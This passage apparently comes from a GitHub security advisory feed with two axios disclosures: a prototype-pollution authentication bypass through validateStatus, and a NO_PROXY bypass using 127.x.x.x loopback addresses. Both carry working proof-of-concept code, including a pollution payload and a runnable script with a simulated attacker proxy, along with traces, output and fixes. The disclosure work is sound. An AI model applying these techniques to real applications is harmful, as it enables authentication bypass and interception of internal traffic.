  HTTP 500 → resolve (SUCCESS!) → application processes error as data
</code></pre>
<h2 id="verified-poc-output">Verified PoC Output</h2>
<pre><code>--- Before Pollution ---
401: REJECTED as expected - Request failed with status code 401
500: REJECTED as expected - Request failed with status code 500

--- After Pollution ---
200: RESOLVED as success (status: 200)
301: RESOLVED as success (status: 301)
401: RESOLVED as success (status: 401)
403: RESOLVED as success (status: 403)
404: RESOLVED as success (status: 404)
500: RESOLVED as success (status: 500)
503: RESOLVED as success (status: 503)

--- Authentication Bypass Demo ---
Auth check bypassed! 401 treated as success.
Application proceeds with: { status: 401, message: 'Response with status 401' }
</code></pre>
<h2 id="impact-analysis">Impact Analysis</h2>
<ul>
<li><strong>Authentication Bypass:</strong> Applications relying on axios rejecting 401/403 to enforce auth will silently accept unauthorized responses, allowing unauthenticated access to protected resources.</li>
<li><strong>Silent Error Swallowing:</strong> 500-series errors are treated as success, causing applications to process error bodies as valid data — leading to data corruption or logic errors.</li>
<li><strong>Security Control Bypass:</strong> Rate limiting (429), WAF blocks (403), and CAPTCHA challenges are suppressed.</li>
<li><strong>Universal Scope:</strong> Affects every axios instance in the application, including third-party libraries.</li>
</ul>
<h2 id="recommended-fix">Recommended Fix</h2>
<p>Replace the <code>in</code> operator with <code>hasOwnProperty</code> in <code>mergeDirectKeys</code>:</p>
<pre><code class="language-javascript">// FIXED: lib/core/mergeConfig.js
function mergeDirectKeys(a, b, prop) {
  if (Object.prototype.hasOwnProperty.call(config2, prop)) {
    return getMergedValue(a, b);
  } else if (Object.prototype.hasOwnProperty.call(config1, prop)) {
    return getMergedValue(undefined, a);
  }
}
</code></pre>
<h2 id="resources">Resources</h2>
<ul>
<li><a href="https://cwe.mitre.org/data/definitions/1321.html">CWE-1321: Prototype Pollution</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/287.html">CWE-287: Improper Authentication</a></li>
<li><a href="https://github.com/advisories/GHSA-fvcv-3m26-pcqx">GHSA-fvcv-3m26-pcqx: Related PP Gadget in Axios</a></li>
<li><a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/in">MDN: <code>in</code> operator</a></li>
<li><a href="https://github.com/axios/axios">Axios GitHub Repository</a></li>
</ul>
<h2 id="timeline">Timeline</h2>
<table>
<thead>
<tr>
<th>Date</th>
<th>Event</th>
</tr>
</thead>
<tbody><tr>
<td>2026-04-15</td>
<td>Vulnerability discovered during source code audit</td>
</tr>
<tr>
<td>2026-04-15</td>
<td>PoC developed and vulnerability confirmed</td>
</tr>
<tr>
<td>2026-04-16</td>
<td>Report revised for accuracy</td>
</tr>
<tr>
<td>TBD</td>
<td>Report submitted to vendor via GitHub Security Advisory</td>
</tr>
</tbody></table>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/axios/axios/security/advisories/GHSA-w9j2-pvgh-6h63">https://github.com/axios/axios/security/advisories/GHSA-w9j2-pvgh-6h63</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-42041">https://nvd.nist.gov/vuln/detail/CVE-2026-42041</a></li>
<li><a href="https://github.com/advisories/GHSA-w9j2-pvgh-6h63">https://github.com/advisories/GHSA-w9j2-pvgh-6h63</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-w9j2-pvgh-6h63</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-05-05T00:21:39.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[axios] Axios: Authentication Bypass via Prototype Pollution Gadget in `validateStatus` Merge Strategy]]></title>
        <id>https://github.com/advisories/GHSA-w9j2-pvgh-6h63</id>
        <link href="https://github.com/advisories/GHSA-w9j2-pvgh-6h63"/>
        <updated>2026-05-05T00:21:40.000Z</updated>
        <content type="html"><![CDATA[<h1 id="vulnerability-disclosure-authentication-bypass-via-prototype-pollution-gadget-in-validatestatus-merge-strategy">Vulnerability Disclosure: Authentication Bypass via Prototype Pollution Gadget in <code>validateStatus</code> Merge Strategy</h1>
<h2 id="summary">Summary</h2>
<p>The Axios library is vulnerable to a Prototype Pollution "Gadget" attack that allows any <code>Object.prototype</code> pollution to <strong>silently suppress all HTTP error responses</strong> (401, 403, 500, etc.), causing them to be treated as successful responses. This completely bypasses application-level authentication and error handling.</p>
<p>The root cause is that <code>validateStatus</code> is the <strong>only</strong> config property using the <code>mergeDirectKeys</code> merge strategy, which uses JavaScript's <code>in</code> operator — an operator that inherently traverses the prototype chain. When <code>Object.prototype.validateStatus</code> is polluted with <code>() =&gt; true</code>, all HTTP status codes are accepted as success.</p>
<p><strong>Severity:</strong> High (CVSS 8.2)
<strong>Affected Versions:</strong> All versions (v0.x - v1.x including v1.15.0)
<strong>Vulnerable Component:</strong> <code>lib/core/mergeConfig.js</code> (<code>mergeDirectKeys</code> strategy) + <code>lib/core/settle.js</code></p>
<h2 id="cwe">CWE</h2>
<ul>
<li><strong>CWE-1321:</strong> Improperly Controlled Modification of Object Prototype Attributes ('Prototype Pollution')</li>
<li><strong>CWE-287:</strong> Improper Authentication</li>
</ul>
<h2 id="cvss-31">CVSS 3.1</h2>
<p><strong>Score: 8.2 (High)</strong></p>
<p>Vector: <code>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:H/A:N</code></p>
<table>
<thead>
<tr>
<th>Metric</th>
<th>Value</th>
<th>Justification</th>
</tr>
</thead>
<tbody><tr>
<td>Attack Vector</td>
<td>Network</td>
<td>PP is triggered remotely</td>
</tr>
<tr>
<td>Attack Complexity</td>
<td>Low</td>
<td>Once PP exists, a single property assignment exploits this. Consistent with GHSA-fvcv-3m26-pcqx</td>
</tr>
<tr>
<td>Privileges Required</td>
<td>None</td>
<td>No authentication needed</td>
</tr>
<tr>
<td>User Interaction</td>
<td>None</td>
<td>No user interaction required</td>
</tr>
<tr>
<td>Scope</td>
<td>Unchanged</td>
<td>Impact within the application</td>
</tr>
<tr>
<td>Confidentiality</td>
<td>Low</td>
<td>401 treated as success may expose data behind auth gates</td>
</tr>
<tr>
<td>Integrity</td>
<td>High</td>
<td>All error handling and auth checks are silently bypassed — application operates on invalid assumptions</td>
</tr>
<tr>
<td>Availability</td>
<td>None</td>
<td>The function works correctly (returns true), no crash</td>
</tr>
</tbody></table>
<h2 id="usage-of-helper-vulnerabilities">Usage of "Helper" Vulnerabilities</h2>
<p>This vulnerability requires <strong>Zero Direct User Input</strong>.</p>
<p>If an attacker can pollute <code>Object.prototype</code> via any other library in the stack, Axios will automatically inherit the polluted <code>validateStatus</code> function during config merge. The <code>in</code> operator in <code>mergeDirectKeys</code> makes this property <strong>uniquely susceptible</strong> to prototype pollution compared to all other config properties.</p>
<h2 id="why-validatestatus-is-uniquely-vulnerable">Why <code>validateStatus</code> Is Uniquely Vulnerable</h2>
<p>All other config properties use <code>defaultToConfig2</code>, which reads <code>config2[prop]</code> (traverses prototype). But <code>validateStatus</code> uses <code>mergeDirectKeys</code>, which uses the <code>in</code> operator:</p>
<pre><code class="language-javascript">// mergeConfig.js:58-64 — mergeDirectKeys (ONLY used by validateStatus)
function mergeDirectKeys(a, b, prop) {
  if (prop in config2) {           // ← `in` traverses prototype chain!
    return getMergedValue(a, b);
  } else if (prop in config1) {
    return getMergedValue(undefined, a);
  }
}

// mergeConfig.js:94
const mergeMap = {
  // ... all others use defaultToConfig2 ...
  validateStatus: mergeDirectKeys,   // ← ONLY property using this strategy
};
</code></pre>
<p>The <code>in</code> operator is a <strong>more aggressive</strong> prototype traversal than property access. While <code>config2['validateStatus']</code> also traverses the prototype, the explicit <code>in</code> check makes the intent clearer and the vulnerability more direct.</p>
<h2 id="proof-of-concept">Proof of Concept</h2>
<h3 id="1-the-setup-simulated-pollution">1. The Setup (Simulated Pollution)</h3>
<pre><code class="language-javascript">Object.prototype.validateStatus = () =&gt; true;
</code></pre>
<h3 id="2-the-gadget-trigger-safe-code">2. The Gadget Trigger (Safe Code)</h3>
<pre><code class="language-javascript">// Application checks authentication via HTTP status codes
try {
  const response = await axios.get('https://api.internal/admin/users');
  // Developer expects: 401 → catch block → redirect to login
  // Reality: 401 → treated as success → displays admin data
  processAdminData(response.data);  // Executes with 401 response body!
} catch (error) {
  redirectToLogin();  // NEVER REACHED for 401/403/500
}
</code></pre>
<h3 id="3-the-execution">3. The Execution</h3>
<pre><code class="language-javascript">// mergeConfig.js:58 — 'validateStatus' in config2
// config2 = { url: '/admin/users', method: 'get' }
// 'validateStatus' in config2 → checks prototype → finds () =&gt; true → TRUE
// → getMergedValue(defaultValidator, () =&gt; true) → returns () =&gt; true

// settle.js:16 — ALL status codes resolve
const validateStatus = response.config.validateStatus;  // () =&gt; true
if (!response.status || !validateStatus || validateStatus(response.status)) {
  resolve(response);  // 401, 403, 500 all resolve here!
}
</code></pre>
<h3 id="4-the-impact">4. The Impact</h3>
<pre><code>Before pollution:
  HTTP 200 → resolve (success)
  HTTP 401 → reject (auth error) → redirectToLogin()
  HTTP 403 → reject (forbidden) → showAccessDenied()
  HTTP 500 → reject (server error) → showErrorPage()

After pollution:
  HTTP 200 → resolve (success)
  HTTP 401 → resolve (SUCCESS!) → processAdminData() with error body
  HTTP 403 → resolve (SUCCESS!) → application thinks user has access
  HTTP 500 → resolve (SUCCESS!) → application processes error as data
</code></pre>
<h2 id="verified-poc-output">Verified PoC Output</h2>
<pre><code>--- Before Pollution ---
401: REJECTED as expected - Request failed with status code 401
500: REJECTED as expected - Request failed with status code 500

--- After Pollution ---
200: RESOLVED as success (status: 200)
301: RESOLVED as success (status: 301)
401: RESOLVED as success (status: 401)
403: RESOLVED as success (status: 403)
404: RESOLVED as success (status: 404)
500: RESOLVED as success (status: 500)
503: RESOLVED as success (status: 503)

--- Authentication Bypass Demo ---
Auth check bypassed! 401 treated as success.
Application proceeds with: { status: 401, message: 'Response with status 401' }
</code></pre>
<h2 id="impact-analysis">Impact Analysis</h2>
<ul>
<li><strong>Authentication Bypass:</strong> Applications relying on axios rejecting 401/403 to enforce auth will silently accept unauthorized responses, allowing unauthenticated access to protected resources.</li>
<li><strong>Silent Error Swallowing:</strong> 500-series errors are treated as success, causing applications to process error bodies as valid data — leading to data corruption or logic errors.</li>
<li><strong>Security Control Bypass:</strong> Rate limiting (429), WAF blocks (403), and CAPTCHA challenges are suppressed.</li>
<li><strong>Universal Scope:</strong> Affects every axios instance in the application, including third-party libraries.</li>
</ul>
<h2 id="recommended-fix">Recommended Fix</h2>
<p>Replace the <code>in</code> operator with <code>hasOwnProperty</code> in <code>mergeDirectKeys</code>:</p>
<pre><code class="language-javascript">// FIXED: lib/core/mergeConfig.js
function mergeDirectKeys(a, b, prop) {
  if (Object.prototype.hasOwnProperty.call(config2, prop)) {
    return getMergedValue(a, b);
  } else if (Object.prototype.hasOwnProperty.call(config1, prop)) {
    return getMergedValue(undefined, a);
  }
}
</code></pre>
<h2 id="resources">Resources</h2>
<ul>
<li><a href="https://cwe.mitre.org/data/definitions/1321.html">CWE-1321: Prototype Pollution</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/287.html">CWE-287: Improper Authentication</a></li>
<li><a href="https://github.com/advisories/GHSA-fvcv-3m26-pcqx">GHSA-fvcv-3m26-pcqx: Related PP Gadget in Axios</a></li>
<li><a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/in">MDN: <code>in</code> operator</a></li>
<li><a href="https://github.com/axios/axios">Axios GitHub Repository</a></li>
</ul>
<h2 id="timeline">Timeline</h2>
<table>
<thead>
<tr>
<th>Date</th>
<th>Event</th>
</tr>
</thead>
<tbody><tr>
<td>2026-04-15</td>
<td>Vulnerability discovered during source code audit</td>
</tr>
<tr>
<td>2026-04-15</td>
<td>PoC developed and vulnerability confirmed</td>
</tr>
<tr>
<td>2026-04-16</td>
<td>Report revised for accuracy</td>
</tr>
<tr>
<td>TBD</td>
<td>Report submitted to vendor via GitHub Security Advisory</td>
</tr>
</tbody></table>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/axios/axios/security/advisories/GHSA-w9j2-pvgh-6h63">https://github.com/axios/axios/security/advisories/GHSA-w9j2-pvgh-6h63</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-42041">https://nvd.nist.gov/vuln/detail/CVE-2026-42041</a></li>
<li><a href="https://github.com/advisories/GHSA-w9j2-pvgh-6h63">https://github.com/advisories/GHSA-w9j2-pvgh-6h63</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-w9j2-pvgh-6h63</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-05-05T00:21:39.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[axios] Axios: Incomplete Fix for CVE-2025-62718 — NO_PROXY Protection Bypassed via RFC 1122 Loopback Subnet (127.0.0.0/8) in Axios 1.15.0]]></title>
        <id>https://github.com/advisories/GHSA-pmwg-cvhr-8vh7</id>
        <link href="https://github.com/advisories/GHSA-pmwg-cvhr-8vh7"/>
        <updated>2026-05-05T00:20:58.000Z</updated>
        <content type="html"><![CDATA[<p><strong>1. Executive Summary</strong>
This report documents an <strong>incomplete security patch</strong> for the previously disclosed vulnerability <strong>GHSA-3p68-rc4w-qgx5 (CVE-2025-62718)</strong>, which affects the <code>NO_PROXY</code> hostname resolution logic in the Axios HTTP library.</p>
<p><strong>Background — The Original Vulnerability</strong>
The original vulnerability (GHSA-3p68-rc4w-qgx5) disclosed that Axios did not normalize hostnames before comparing them against <code>NO_PROXY</code> rules. Specifically, a request to <code>http://localhost./</code> (with a trailing dot) or <code>http://[::1]/</code> (with IPv6 bracket notation) would <strong>bypass NO_PROXY matching entirely</strong> and be forwarded to the configured HTTP proxy — even when <code>NO_PROXY=localhost,127.0.0.1,::1</code> was explicitly set by the developer to protect loopback services.</p>
<p>The Axios maintainers addressed this in <strong>version 1.15.0</strong> by introducing a <code>normalizeNoProxyHost()</code> function in <code>lib/helpers/shouldBypassProxy.js</code>, which strips trailing dots from hostnames and removes brackets from IPv6 literals before performing the NO_PROXY comparison.</p>
<p><strong>The Incomplete Patch — This Finding</strong>
While the patch correctly addresses the specific cases reported (trailing dot normalization and IPv6 bracket removal), <strong>the fix is architecturally incomplete</strong>.</p>
<p>The patch introduced a hardcoded set of recognized loopback addresses:</p>
<pre><code>// lib/helpers/shouldBypassProxy.js — Line 1
const LOOPBACK_ADDRESSES = new Set(['localhost', '127.0.0.1', '::1']);
</code></pre>
<p>However, <strong>RFC 1122 §3.2.1.3</strong> explicitly defines the <strong>entire 127.0.0.0/8 subnet</strong> as the IPv4 loopback address block not just the single address <code>127.0.0.1</code>. On all major operating systems (Linux, macOS, Windows with WSL), any IP address in the range <code>127.0.0.2</code> through <code>127.255.255.254</code> is a valid, functional loopback address that routes to the local machine.</p>
<p>As a result, an attacker who can influence the target URL of an Axios request can substitute 127.0.0.1 with any other address in the <code>127.0.0.0/8</code> range (e.g., <code>127.0.0.2</code>, <code>127.0.0.100</code>, <code>127.1.2.3</code>) to <strong>completely bypass</strong> the <code>NO_PROXY</code> protection even in the fully patched Axios 1.15.0 release.</p>
<p><strong>Verification</strong>
This bypass has been <strong>independently verified</strong> on:</p>
<ul>
<li><strong>Axios version:</strong> 1.15.0 (latest patched release)</li>
<li><strong>Node.js version:</strong> v22.16.0</li>
<li><strong>OS:</strong> Kali Linux (rolling)</li>
</ul>
<p>The Proof-of-Concept demonstrates that while <code>localhost</code>, <code>localhost</code>., and <code>[::1]</code> are correctly blocked by the patched version, requests to <code>127.0.0.2</code>, <code>127.0.0.100</code>, and <code>127.1.2.3</code> are <strong>transparently forwarded to the attacker-controlled proxy server</strong>, confirming that the patch does not cover the full RFC-defined loopback address space.</p>
<p><strong>2. Deep-Dive: Technical Root Cause Analysis</strong>
<strong>2.1 Vulnerable File &amp; Location</strong></p>
<table>
<thead>
<tr>
<th>Field</th>
<th>Detail</th>
</tr>
</thead>
<tbody><tr>
<td>File</td>
<td>lib/helpers/shouldBypassProxy.js</td>
</tr>
<tr>
<td>Primary Flaw</td>
<td>isLoopback() — Line 1–3</td>
</tr>
<tr>
<td>Supporting Function</td>
<td>shouldBypassProxy() — Line 59–110</td>
</tr>
<tr>
<td>Axios Version</td>
<td>1.15.0 (Latest Patched Release)</td>
</tr>
</tbody></table>
<p><strong>2.2 How Axios Routes HTTP Requests  The Call Chain</strong>
When Axios dispatches any HTTP request, <code>lib/adapters/http.js</code> calls <code>setProxy()</code>, which invokes <code>shouldBypassProxy()</code> to decide whether to honour a configured proxy:</p>
<pre><code>// lib/adapters/http.js — Lines 191–199
function setProxy(options, configProxy, location) {
  let proxy = configProxy;
  if (!proxy &amp;&amp; proxy !== false) {
    const proxyUrl = getProxyForUrl(location);   // Step 1: Read proxy env var
    if (proxyUrl) {
      if (!shouldBypassProxy(location)) {         // Step 2: Check NO_PROXY
        proxy = new URL(proxyUrl);               // Step 3: Assign proxy
      }
    }
  }
}
</code></pre>
<p><code>shouldBypassProxy()</code> is the <strong>single gatekeeper</strong> for NO_PROXY enforcement. A bypass here means all proxy protection fails silently.</p>
<p><strong>2.3 The Original Vulnerability (GHSA-3p68-rc4w-qgx5)</strong>
Before Axios 1.15.0, hostnames were compared against <code>NO_PROXY</code> using a <strong>raw literal string match</strong> with no normalization:</p>
<pre><code>Request URL → http://localhost./secret
NO_PROXY    → "localhost,127.0.0.1,::1"
Comparison:
  "localhost." === "localhost"   →  FALSE  →  Proxy used  ← BYPASS
  "[::1]"     === "::1"         →  FALSE  →  Proxy used  ← BYPASS
</code></pre>
<p>Both <code>localhost.</code> (FQDN trailing dot, RFC 1034 §3.1) and <code>[::1]</code> (bracketed IPv6 literal, RFC 3986 §3.2.2) are <strong>canonical representations of loopback addresses</strong>, but Axios treated them as unknown hosts.</p>
<p><strong>2.4 What the Patch Fixed (Axios 1.15.0)</strong>
The patch introduced three changes inside <code>lib/helpers/shouldBypassProxy.js</code>:</p>
<img width="602" height="123" alt="01_axios_version_verification" src="https://github.com/user-attachments/assets/844446f2-01fb-4933-9316-fb849c40c8f5">

<p><strong>Fix A <code>normalizeNoProxyHost()</code> (Lines 47–57)</strong>
Strips alternate representations before comparison:</p>
<pre><code>const normalizeNoProxyHost = (hostname) =&gt; {
  if (!hostname) return hostname;
  // Remove IPv6 brackets: "[::1]" → "::1"
  if (hostname.charAt(0) === '[' &amp;&amp; hostname.charAt(hostname.length - 1) === ']') {
    hostname = hostname.slice(1, -1);
  }
  // Strip trailing FQDN dot: "localhost." → "localhost"
  return hostname.replace(/\.+$/, '');
};
</code></pre>
<p><strong>Fix B Cross-Loopback Equivalence (Lines 1–3 &amp; 108)</strong>
Allows <code>127.0.0.1</code> and <code>localhost</code> to match each other interchangeably:</p>
<pre><code>const LOOPBACK_ADDRESSES = new Set(['localhost', '127.0.0.1', '::1']);
const isLoopback = (host) =&gt; LOOPBACK_ADDRESSES.has(host);
// Line 108 — Final match condition:
return hostname === entryHost
    || (isLoopback(hostname) &amp;&amp; isLoopback(entryHost));
//      ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
//      If both sides are "loopback" → treat as match
</code></pre>
<p><strong>Fix C Normalization Applied on Both Sides (Lines 81 &amp; 90)</strong></p>
<pre><code>// Request hostname normalized:
const hostname = normalizeNoProxyHost(parsed.hostname.toLowerCase());
// Each NO_PROXY entry normalized:
entryHost = normalizeNoProxyHost(entryHost);
</code></pre>
<p><strong>2.5 The Incomplete Patch Exact Root Cause</strong>
The fundamental flaw resides in Line 1:</p>
<pre><code>// lib/helpers/shouldBypassProxy.js — Line 1  ← ROOT CAUSE
const LOOPBACK_ADDRESSES = new Set(['localhost', '127.0.0.1', '::1']);
//                                              ^^^^^^^^^^^
//                              Only ONE IPv4 loopback address is recognized.
//                              The entire 127.0.0.0/8 subnet is unaccounted for.
// Line 3 — Lookup against this incomplete set:
const isLoopback = (host) =&gt; LOOPBACK_ADDRESSES.has(host);
//                                               ^^^^^^^^^
//                          Returns FALSE for any 127.x.x.x ≠ 127.0.0.1
</code></pre>
<img width="884" height="135" alt="02_vulnerable_code_loopback_addresses" src="https://github.com/user-attachments/assets/ba06b91e-a2d2-4a99-9e1f-8c8bfbb6d71e">

<p>*<strong>RFC 1122 §3.2.1.3 is unambiguous:</strong></p>
<blockquote>
<p>"The address 127.0.0.0/8 is assigned for loopback. A datagram sent by a higher-level protocol to a loopback address MUST NOT appear on any network."</p>
</blockquote>
<p>This means all addresses from <code>127.0.0.1</code> through <code>127.255.255.254</code> are valid loopback addresses on any RFC-compliant operating system. On Linux, the entire <code>/8</code> block is routed to the <code>lo</code> interface by default. The patch recognises only <code>127.0.0.1</code>, leaving <code>16,777,213</code> valid loopback addresses unprotected.</p>
<img width="884" height="537" alt="03_rfc1122_loopback_definition" src="https://github.com/user-attachments/assets/951eabb4-2ec6-40ef-ad00-1fd5b9aed2d0">

<p><strong>2.6 Step-by-Step Bypass Execution Trace</strong>
Environment:</p>
<pre><code>NO_PROXY   = "localhost,127.0.0.1,::1"
HTTP_PROXY = "http://attacker-proxy:5300"
Target URL = "http://127.0.0.2:9191/internal-api"
</code></pre>
<p><strong>Annotated execution of shouldBypassProxy("<a href="http://127.0.0.2:9191/internal-api">http://127.0.0.2:9191/internal-api</a>"):</strong></p>
<pre><code>// Step 1 — Parse the request URL
parsed   = new URL("http://127.0.0.2:9191/internal-api")
hostname = "127.0.0.2"    // parsed.hostname
// Step 2 — Read NO_PROXY environment variable
noProxy  = "localhost,127.0.0.1,::1"   // lowercased
// Step 3 — Normalize the request hostname
hostname = normalizeNoProxyHost("127.0.0.2")
//          No brackets → skip
//          No trailing dot → skip
//          Result: "127.0.0.2"  (unchanged)
// Step 4 — Iterate over NO_PROXY entries
//  Entry → "localhost"
entryHost = "localhost"
"127.0.0.2" === "localhost"                  → false
isLoopback("127.0.0.2")                      → false  ← Set.has() returns false
                                                          BYPASS starts here
//  Entry → "127.0.0.1"
entryHost = "127.0.0.1"
"127.0.0.2" === "127.0.0.1"                 → false
isLoopback("127.0.0.2") &amp;&amp; isLoopback("127.0.0.1")
  → LOOPBACK_ADDRESSES.has("127.0.0.2")     → false  ← Same failure
  → false
//  Entry → "::1"
entryHost = "::1"
"127.0.0.2" === "::1"                        → false
isLoopback("127.0.0.2") &amp;&amp; isLoopback("::1")
  → LOOPBACK_ADDRESSES.has("127.0.0.2")     → false  ← Same failure
  → false
// Step 5 — Final return
shouldBypassProxy() → false
//  Axios proceeds to route the request through the configured proxy.
//  The attacker's proxy server receives the full request including headers
//  and any response from the internal service.
</code></pre>
<p><strong>2.7 Why the Patch Design Is Flawed</strong>
The patch addresses the <strong>symptom</strong> (two specific alternate representations) rather than the <strong>root cause</strong> (an incomplete definition of what constitutes a loopback address).</p>
<table>
<thead>
<tr>
<th>Aspect</th>
<th>Original Bug</th>
<th>This Finding</th>
</tr>
</thead>
<tbody><tr>
<td>What was wrong</td>
<td>No normalization before comparison</td>
<td>Incomplete loopback address set</td>
</tr>
<tr>
<td>Fix applied</td>
<td>Added normalizeNoProxyHost()</td>
<td>None set remains hardcoded</td>
</tr>
<tr>
<td>RFC compliance</td>
<td>Violated RFC 1034 &amp; RFC 3986</td>
<td>Violates RFC 1122 §3.2.1.3</td>
</tr>
<tr>
<td>Bypass method</td>
<td>Alternate string representation</td>
<td>Alternate valid loopback address</td>
</tr>
<tr>
<td>Impact</td>
<td>NO_PROXY bypass → SSRF</td>
<td>NO_PROXY bypass → SSRF (identical)</td>
</tr>
</tbody></table>
<pre><code>**2.8 Total Exposed Address Space**
Protected by patch:    127.0.0.1          (1 address)
Unprotected loopback:  127.0.0.2
                       through
                       127.255.255.254    (16,777,213 addresses)
</code></pre>
<p>Real-world services that commonly bind to non-standard loopback addresses include:</p>
<ul>
<li>Internal microservices and admin dashboards using dedicated loopback IPs</li>
<li>Development environments with multiple isolated service instances</li>
<li>Docker and container bridge network configurations</li>
<li>Test infrastructure allocating sequential loopback IPs across services</li>
</ul>
<p><strong>3. Comprehensive Attack Vector &amp; Proof of Concept</strong></p>
<p><strong>3.1 Reproduction Steps</strong></p>
<p>Step 1 — Create a fresh project directory</p>
<pre><code>mkdir axios-bypass-test &amp;&amp; cd axios-bypass-test
</code></pre>
<p><strong>Step 2 — Initialize the project with the patched Axios version</strong>
Create <code>package.json</code>:</p>
<pre><code>{
  "type": "module",
  "dependencies": {
    "axios": "1.15.0"
  }
}
</code></pre>
<p>Install dependencies:</p>
<pre><code>npm install
</code></pre>
<p>Verify the installed version:</p>
<pre><code>npm list axios
# Expected output: axios@1.15.0
</code></pre>
<p><strong>Step 3 — Create the PoC file (<code>poc.js</code>)</strong></p>
<pre><code>import http from 'http';
import axios from 'axios';
// ── Simulated attacker-controlled proxy server ────────────────────────────────
const PROXY_PORT = 5300;
http.createServer((req, res) =&gt; {
  console.log('\n[!] PROXY HIT — Attacker proxy received request!');
  console.log(`    Method : ${req.method}`);
  console.log(`    URL    : ${req.url}`);
  console.log(`    Host   : ${req.headers.host}`);
  res.writeHead(200);
  res.end('proxied');
}).listen(PROXY_PORT);
// ── Simulated developer security configuration ────────────────────────────────
// Developer believes all loopback traffic is protected by NO_PROXY.
process.env.HTTP_PROXY = `http://127.0.0.1:${PROXY_PORT}`;
process.env.NO_PROXY   = 'localhost,127.0.0.1,::1';
// ── Test helper ───────────────────────────────────────────────────────────────
async function test(url) {
  console.log(`\n[*] Testing: ${url}`);
  try {
    const res = await axios.get(url, { timeout: 2000 });
    if (res.data === 'proxied') {
      console.log('    Result → [PROXIED]  ← BYPASS CONFIRMED');
    } else {
      console.log('    Result → [DIRECT]   ← Safe, no proxy used');
    }
  } catch (err) {
    if (err.code === 'ECONNREFUSED') {
      console.log('    Result → [DIRECT]   ← ECONNREFUSED (request did not go through proxy)');
    }
  }
}
// ── Test execution ────────────────────────────────────────────────────────────
setTimeout(async () =&gt; {
  // Section A: Cases fixed by the existing patch — expected to go DIRECT
  console.log('\n=== PATCHED CASES (Expected: All requests bypass the proxy) ===');
  await test('http://localhost:9191/secret');
  await test('http://localhost.:9191/secret');
  await test('http://[::1]:9191/secret');
  // Section B: Bypass cases — expected to go DIRECT, but actually go through proxy
  console.log('\n=== BYPASS CASES (Expected: bypass proxy | Actual: routed through proxy) ===');
  await test('http://127.0.0.2:9191/secret');
  await test('http://127.0.0.100:9191/secret');
  await test('http://127.1.2.3:9191/secret');
  process.exit(0);
}, 500);
</code></pre>
<p><strong>Step 4 — Execute the PoC</strong></p>
<pre><code>node poc.js
</code></pre>
<p><strong>3.2 Observed Output</strong>
The following output was captured during testing on Kali Linux with Axios 1.15.0:</p>
<pre><code>=== PATCHED CASES (Expected: All requests bypass the proxy) ===
[*] Testing: http://localhost:9191/secret
    Result → [DIRECT]   ← ECONNREFUSED (request did not go through proxy)  
[*] Testing: http://localhost.:9191/secret
    Result → [DIRECT]   ← ECONNREFUSED (request did not go through proxy)  
[*] Testing: http://[::1]:9191/secret
    Result → [DIRECT]   ← ECONNREFUSED (request did not go through proxy)  
=== BYPASS CASES (Expected: bypass proxy | Actual: routed through proxy) ===
[*] Testing: http://127.0.0.2:9191/secret
[!] PROXY HIT — Attacker proxy received request!
    Method : GET
    URL    : http://127.0.0.2:9191/secret
    Host   : 127.0.0.2:9191
    Result → [PROXIED]  ← BYPASS CONFIRMED                                 
[*] Testing: http://127.0.0.100:9191/secret
[!] PROXY HIT — Attacker proxy received request!
    Method : GET
    URL    : http://127.0.0.100:9191/secret
    Host   : 127.0.0.100:9191
    Result → [PROXIED]  ← BYPASS CONFIRMED                                 
[*] Testing: http://127.1.2.3:9191/secret
[!] PROXY HIT — Attacker proxy received request!
    Method : GET
    URL    : http://127.1.2.3:9191/secret
    Host   : 127.1.2.3:9191
    Result → [PROXIED]  ← BYPASS CONFIRMED                                 
</code></pre>
<img width="1621" height="739" alt="05_poc_execution_bypass_confirmed" src="https://github.com/user-attachments/assets/6caf9f7a-36ed-4feb-b9f3-f82532da2de7">

<p><strong>3.3 Analysis of Results</strong>
The output conclusively demonstrates the following:</p>
<p><strong>Patched cases behave correctly:</strong> Requests to <code>localhost</code>, <code>localhost.</code> (trailing dot), and <code>[::1]</code> (bracketed IPv6) all result in a direct connection, confirming that the existing patch in Axios 1.15.0 correctly handles the cases reported in GHSA-3p68-rc4w-qgx5.</p>
<p><strong>Bypass cases confirm the incomplete patch:</strong> Requests to <code>127.0.0.2</code>, <code>127.0.0.100</code>, and <code>127.1.2.3</code> all of which are valid loopback addresses within the <code>127.0.0.0/8</code> subnet as defined by <code>RFC 1122 §3.2.1.3</code> are transparently forwarded to the attacker-controlled proxy server. The proxy receives the full request including the HTTP method, target URL, and <code>Host</code> header, demonstrating that any response from an internal service bound to these addresses would be fully intercepted.</p>
<p>This confirms that the <code>NO_PROXY</code> protection configured by the developer (<code>localhost,127.0.0.1,::1</code>) fails silently for the entire <code>127.0.0.0/8</code> address range beyond <code>127.0.0.1</code>, providing a reproducible and reliable bypass of the security control introduced by the patch.</p>
<p><strong>4. Impact Assessment</strong>
This vulnerability is a <strong>security control bypass</strong> specifically an incomplete patch that allows an attacker to circumvent the <code>NO_PROXY</code> protection mechanism in Axios by using any loopback addresses within the <code>127.0.0.0/8</code> subnet other than <code>127.0.0.1</code>. The result is that traffic intended to remain private and direct is silently intercepted by a configured proxy server.</p>
<p><strong>4.1 Who Is Impacted?</strong></p>
<p>Primary Target — Node.js Backend Applications
Any Node.js application that meets <strong>all three of the following conditions</strong> is vulnerable:</p>
<pre><code>Condition 1:  Uses Axios 1.15.0 (latest patched) for HTTP requests
